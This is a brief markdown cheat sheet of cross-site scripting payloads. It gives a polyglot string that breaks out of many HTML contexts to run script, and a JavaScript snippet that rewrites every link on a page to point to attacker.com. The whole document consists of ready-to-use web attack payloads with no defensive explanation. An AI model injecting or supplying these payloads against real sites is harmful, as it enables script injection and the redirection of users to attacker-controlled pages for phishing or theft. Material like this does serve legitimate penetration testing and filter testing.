# XSS

Few famous XSS tool


**Polyglot payload

```
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
```




**Payload to replace all links

```
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://attacker.com";
});

```
